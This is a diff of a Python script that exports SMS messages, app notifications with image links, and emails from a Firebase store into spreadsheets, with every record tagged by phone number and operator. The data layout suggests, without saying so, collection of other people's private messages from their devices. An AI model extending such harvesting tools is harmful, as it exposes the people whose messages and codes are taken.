@@ -38,8 +38,9 @@ def saveDf(dicts, type):
     df = pd.DataFrame(dicts)
     try:
         df.to_excel(getDbName(type) + '-' + getTime() + '.xlsx')
-    except:
+    except Exception as e:
         print('Error in saving xlsx, saving csv')
+        print(e)
         df.to_csv(getDbName(type) + '-' + getTime() + '.csv')
     print(getDbName(type) + ' Saved')
 
@@ -61,7 +62,15 @@ def getSMS():
 
     dicts = []
     for doc in docs:
-        dicts.append(doc.to_dict())
+        dic = doc.to_dict()
+        resp = {
+            'operator': dic['operator'],
+            'phone': dic['phone'],
+            'sender': dic['address'],
+            'time': str(dic['time']),
+            'body': dic['body']
+        }
+        dicts.append(resp)
 
     saveDf(dicts, type)
 
@@ -71,7 +80,23 @@ def getNotifications():
 
     dicts = []
     for doc in docs:
-        dicts.append(doc.to_dict())
+        dic = doc.to_dict()
+        resp = {
+            'operator': dic['operator'],
+            'phone': dic['phone'],
+            'app': dic['packageName'],
+            'time': str(dic['time']),
+            'title': dic['title'],
+            'body': dic['text']
+        }
+        if 'displayText' in dic and not str(resp['body']).__contains__(dic['displayText']):
+            resp['body'] = resp['body'] + '\n' + dic['displayText']
+        if 'info' in dic and not str(resp['body']).__contains__(dic['info']):
+            resp['body'] = resp['body'] + '\n' + dic['info']
+        if 'summary' in dic and not str(resp['body']).__contains__(dic['summary']):
+            resp['body'] = resp['body'] + '\n' + dic['summary']
+        resp['body'] = resp['body'].strip()
+        dicts.append(resp)
 
     saveDf(dicts, type)
 
@@ -81,7 +106,23 @@ def getNotificationsImages():
 
     dicts = []
     for doc in docs:
-        dicts.append(doc.to_dict())
+        dic = doc.to_dict()
+        resp = {
+            'phone': dic['phone'],
+            'app': dic['packageName'],
+            'time': str(dic['time']),
+            'title': dic['title'],
+            'body': dic['text'],
+            'imageURL': dic['downloadURL']
+        }
+        if 'displayText' in dic and not str(resp['body']).__contains__(dic['displayText']):
+            resp['body'] = resp['body'] + '\n' + dic['displayText']
+        if 'info' in dic and not str(resp['body']).__contains__(dic['info']):
+            resp['body'] = resp['body'] + '\n' + dic['info']
+        if 'summary' in dic and not str(resp['body']).__contains__(dic['summary']):
+            resp['body'] = resp['body'] + '\n' + dic['summary']
+        resp['body'] = resp['body'].strip()
+        dicts.append(resp)
 
     saveDf(dicts, type)
 
@@ -97,7 +138,7 @@ def getEmails():
             'phone': dic['mobile'],
             'email': dic['receiver'],
             'sender': dic['sender'],
-            'time': dic['time'],
+            'time': str(dic['time']),
             'subject': dic['subject'],
             'body': dic['body']
         }
@@ -108,5 +149,6 @@ def getEmails():
 if __name__ == '__main__':
     initFirebase()
     # getSMS()
-    # getNotificationsImages()
-    getEmails()
+    # getNotifications()
+    getNotificationsImages()
+    # getEmails()
